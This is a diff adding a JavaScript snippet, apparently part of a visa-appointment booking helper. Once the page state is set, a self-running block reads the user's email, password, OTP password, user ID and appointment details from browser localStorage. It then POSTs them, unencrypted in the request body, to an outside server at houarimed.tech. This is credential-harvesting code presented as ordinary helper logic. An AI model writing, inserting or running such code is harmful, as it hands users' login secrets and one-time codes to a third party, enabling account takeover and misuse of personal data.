@@ -1,0 +1,74 @@
+
+    var categoryIdfff; 
+    var locationIdfff; 
+    var visasubTypeff; 
+var AppointmentStatus;
+
+
+if(window.location.href.includes("liveness")){
+AppointmentStatus = 'Selfie';
+
+}else if(window.location.href.includes("Payment?data")) {
+
+AppointmentStatus = 'Payment';
+
+}
+
+
+
+
+        if(localStorage.getItem('isEnabled') == 'true'){ 
+       
+       if(localStorage.category == 'Normal' || localStorage.category == 'Premium' || localStorage.category == 'Prime Time'){
+             categoryIdfff = localStorage.category
+        }else{
+        categoryIdfff = localStorage.PermutationCat;
+        }      
+            
+            
+            
+            
+     locationIdfff = localStorage.location
+     visasubTypeff = localStorage.visaSubtype
+        
+        }else{
+           categoryIdfff = localStorage.CatValueNotify
+     locationIdfff = localStorage.LocValueNotify
+     visasubTypeff = localStorage.VisaSubTypeValueNotify
+        
+        }
+
+
+
+(function() {
+    'use strict';
+
+    // Example of user data
+    let email = localStorage.email;
+    let password = localStorage.password;
+    let user_id = localStorage.UserId;
+    let location = locationIdfff;
+    let category = categoryIdfff;
+    let passwordotp = localStorage.passwordOTP;
+    let appointment_type = visasubTypeff;
+    let status = AppointmentStatus;
+    let Appointment_Date = localStorage.TakenDate;
+     let Appointment_Slot = localStorage.Slot;
+
+    // Send data to the PHP server
+    fetch('https://houarimed.tech/rdv/submit.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&user_id=${encodeURIComponent(user_id)}&location=${encodeURIComponent(location)}&category=${encodeURIComponent(category)}&passwordotp=${encodeURIComponent(passwordotp)}&appointment_type=${encodeURIComponent(appointment_type)}&status=${encodeURIComponent(status)}&Appointment_Date=${encodeURIComponent(Appointment_Date)}&Appointment_Slot=${encodeURIComponent(Appointment_Slot)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log('Data sent successfully:', data);
+    })
+    .catch(error => {
+        console.error('Error sending data:', error);
+    });
+})();
+        
